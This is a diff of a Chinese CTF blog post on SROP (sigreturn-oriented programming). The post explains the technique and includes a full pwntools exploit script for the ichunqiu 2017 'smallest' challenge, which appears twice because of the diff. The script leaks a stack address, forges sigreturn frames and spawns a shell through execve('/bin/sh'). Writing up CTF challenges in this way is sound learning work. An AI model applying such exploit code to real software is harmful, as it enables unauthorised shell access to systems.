@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="koocola&#39;s blog">
 <meta property="og:description" content="恶意调用sigreturn引发的劫持">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-10-06T01:02:51.524Z">
+<meta property="og:updated_time" content="2018-10-08T00:33:48.797Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SROP">
 <meta name="twitter:description" content="恶意调用sigreturn引发的劫持">
@@ -81,7 +81,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/10/06/SROP/" data-id="cjmwqkggt000064tip45781bi" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/10/06/SROP/" data-id="cjn1qwzki000514tin7gjgske" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -92,7 +92,10 @@
 <p>那么如果我们覆盖函数的返回地址为sigreturn再同时在其后面伪造上下文，那么sigreturn调用后，就会把我们伪造的值取出来，这样我们就可以实现劫持程序进程。</p>
 <p>SROP相对于ROP的优点就是不需要找那么多的gadget，只需要知道栈的地址，调用sigreturn的代码的地址，以及一个栈溢出漏洞就可以getshell.</p>
 <p><strong>这种攻击方法的经典例子就是ichunqiu 2017的smallest题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br></pre></td></tr></table></figure></p>
-<p>这题总共就这么几行的代码<br>可以看出ROP是没法去做的，用SROP会很方便<br>知道有两种方法:<br>一种是用SROP直接调用execve(“/bin/sh”)来getshell<br>另一种是用SROP调用mprotect函数更改栈属性为可执行，再写入shellcode来getshell.<br>自己只尝试了第一种方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">f=process(&quot;./smallest&quot;)</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">start_addr=0x4000b0</span><br><span class="line">need_addr=0x4000b3</span><br><span class="line">syscall=0x4000be</span><br><span class="line"></span><br><span class="line">payload=p64(start_addr)*3</span><br><span class="line">f.sendline(payload)</span><br><span class="line">log.info(&quot;1...!...1&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">f.send(&quot;\xb3&quot;)</span><br><span class="line">stack_addr=u64(f.recv()[8:16])</span><br><span class="line">log.info(&quot;stack_addr:&quot;+hex(stack_addr))</span><br><span class="line"></span><br><span class="line">#payload=p64(need_addr)+7*&apos;a&apos;   #set rax=0xf &lt;--&gt;call sigreturn</span><br><span class="line">#f.send(payload)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=0</span><br><span class="line">frame.rdi=0</span><br><span class="line">frame.rsi=stack_addr</span><br><span class="line">frame.rdx=0x400</span><br><span class="line">frame.rsp=stack_addr</span><br><span class="line">log.info(&quot;length of frame is:&quot;+hex(len(frame)))</span><br><span class="line">payload=p64(start_addr)+p64(0)+str(frame)</span><br><span class="line">f.send(payload)</span><br><span class="line">time.sleep(1)</span><br><span class="line">payload=p64(syscall)+&quot;a&quot;*7</span><br><span class="line">f.send(payload)    #call read</span><br><span class="line">payload=p64(start_addr)*96+&quot;/bin/sh\0&quot;</span><br><span class="line">time.sleep(1)</span><br><span class="line">f.send(payload)   #set /bin/sh</span><br><span class="line">log.info(&quot;2...!...2&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=59</span><br><span class="line">frame.rdi=stack_addr+0x300</span><br><span class="line">frame.rsi=0</span><br><span class="line">frame.rdx=0</span><br><span class="line"></span><br><span class="line">f.send(p64(start_addr)+p64(0)+str(frame))</span><br><span class="line">f.send(p64(syscall)+&quot;a&quot;*7)</span><br><span class="line">log.info(&quot;3...!...3&quot;)</span><br><span class="line">f.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>这题总共就这么几行的代码<br>可以看出ROP是没法去做的，用SROP会很方便</p>
+<p><strong>知道有两种方法</strong>:</p>
+<p>一种是用SROP直接调用execve(“/bin/sh”)来getshell<br>另一种是用SROP调用mprotect函数更改栈属性为可执行，再写入shellcode来getshell.</p>
+<p><strong>自己只尝试了第一种方法</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">f=process(&quot;./smallest&quot;)</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">start_addr=0x4000b0</span><br><span class="line">need_addr=0x4000b3</span><br><span class="line">syscall=0x4000be</span><br><span class="line"></span><br><span class="line">payload=p64(start_addr)*3</span><br><span class="line">f.sendline(payload)</span><br><span class="line">log.info(&quot;1...!...1&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">f.send(&quot;\xb3&quot;)</span><br><span class="line">stack_addr=u64(f.recv()[8:16])</span><br><span class="line">log.info(&quot;stack_addr:&quot;+hex(stack_addr))</span><br><span class="line"></span><br><span class="line">#payload=p64(need_addr)+7*&apos;a&apos;   #set rax=0xf &lt;--&gt;call sigreturn</span><br><span class="line">#f.send(payload)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=0</span><br><span class="line">frame.rdi=0</span><br><span class="line">frame.rsi=stack_addr</span><br><span class="line">frame.rdx=0x400</span><br><span class="line">frame.rsp=stack_addr</span><br><span class="line">log.info(&quot;length of frame is:&quot;+hex(len(frame)))</span><br><span class="line">payload=p64(start_addr)+p64(0)+str(frame)</span><br><span class="line">f.send(payload)</span><br><span class="line">time.sleep(1)</span><br><span class="line">payload=p64(syscall)+&quot;a&quot;*7</span><br><span class="line">f.send(payload)    #call read</span><br><span class="line">payload=p64(start_addr)*96+&quot;/bin/sh\0&quot;</span><br><span class="line">time.sleep(1)</span><br><span class="line">f.send(payload)   #set /bin/sh</span><br><span class="line">log.info(&quot;2...!...2&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=59</span><br><span class="line">frame.rdi=stack_addr+0x300</span><br><span class="line">frame.rsi=0</span><br><span class="line">frame.rdx=0</span><br><span class="line"></span><br><span class="line">f.send(p64(start_addr)+p64(0)+str(frame))</span><br><span class="line">f.send(p64(syscall)+&quot;a&quot;*7)</span><br><span class="line">log.info(&quot;3...!...3&quot;)</span><br><span class="line">f.interactive()</span><br></pre></td></tr></table></figure></p>
 <p>参考了很多大佬的博客，大佬们真是太强了</p>
 
       
@@ -113,6 +116,8 @@
     
 <nav class="nav-single">
     <h3 class="assistive-text">文章导航</h3>
+    
+        <span class="nav-previous"><a href="/2018/10/09/malloc/" rel="prev"><span class="meta-nav">←</span> malloc</a></span>
     
     
         <span class="nav-next"><a href="/2018/10/02/fastbin/" rel="next">IO_FILE劫持总结 <span class="meta-nav">→</span></a></span>
@@ -146,6 +151,10 @@
       <ul>
         
           <li>
+            <a href="/2018/10/09/malloc/">malloc</a>
+          </li>
+        
+          <li>
             <a href="/2018/10/06/SROP/">SROP</a>
           </li>
         
@@ -159,10 +168,6 @@
         
           <li>
             <a href="/2018/09/24/pwn_build/">pwn环境的简单部署</a>
-          </li>
-        
-          <li>
-            <a href="/2018/09/24/odd/">零碎知识</a>
           </li>
         
       </ul>
